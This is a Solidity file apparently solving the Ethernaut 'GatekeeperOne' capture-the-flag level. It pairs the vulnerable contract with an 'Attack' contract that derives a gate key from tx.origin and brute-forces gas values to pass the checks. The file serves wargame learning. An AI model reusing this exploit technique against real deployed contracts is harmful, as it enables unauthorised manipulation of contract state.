pragma solidity ^0.4.18;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(msg.gas % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint32(_gateKey) == uint16(_gateKey));
    require(uint32(_gateKey) != uint64(_gateKey));
    require(uint32(_gateKey) == uint16(tx.origin));
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Attack {

    address public instance_address = 0xad94d66bd88f94f2bb78c0e592b018277294dde9;
    bytes8 public _gateKey = bytes8(tx.origin) & 0xFFFFFFFF0000FFFF;

    GatekeeperOne target = GatekeeperOne(instance_address);

    function hack() public {
        // target.call.gas(999999)(bytes4(keccak256("enter(bytes8)")), _gateKey);
        for (uint256 i = 0; i < 120; i++) {
            target.call.gas(i + 150 + 8191 * 3)(bytes4(keccak256("enter(bytes8)")), _gateKey);
        }
    }
}